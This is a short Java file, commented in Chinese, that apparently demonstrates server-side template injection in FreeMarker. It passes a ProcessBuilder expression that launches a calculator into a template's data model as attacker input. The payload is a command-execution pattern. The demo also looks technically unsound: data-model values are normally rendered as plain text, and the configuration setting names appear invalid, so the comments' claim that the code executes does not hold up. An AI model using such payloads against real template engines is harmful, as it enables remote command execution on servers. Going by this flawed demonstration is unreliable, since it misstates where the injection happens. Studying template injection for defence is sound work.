package SSTIVuln;

import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;
import java.io.*;
import java.util.*;

public class vuln1 {
    public static void main(String[] args) throws Exception{
        // Step 1: 创建配置对象
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_21);

        cfg.setClassForTemplateLoading(vuln1.class, "/");
        cfg.setSetting("freemarker.template.allow_static_method_access", "false");
        cfg.setSetting("freemarker.template.allow_class_access", "false");


        // Step 2: 设置模板文件的加载路径
        cfg.setDirectoryForTemplateLoading(new File("templates"));

        // Step 3: 获取模板
        Template template = cfg.getTemplate("hello.ftl");

        // Step 4: 创建数据模型
        Map<String, Object> dataModel = new HashMap<>();

        // 假设用户输入了恶意模板内容，这里输入的是一个可以执行命令的表达式
        // 攻击者可以注入任意表达式，例如执行命令或者计算等
        String userInput = "${(new java.lang.ProcessBuilder('/usr/bin/gnome-calculator')).start()}";

        // 通过外部输入来构造 name 字段，使得模板执行恶意代码
        dataModel.put("name", userInput);  // 外部输入的恶意代码
        dataModel.put("age", 30);

        // Step 5: 创建输出流
        Writer out = new OutputStreamWriter(System.out);

        // Step 6: 合并模板和数据模型
        try {
            template.process(dataModel, out); // 输出到控制台
        } catch (TemplateException | IOException e) {
            e.printStackTrace();
        }
    }
}
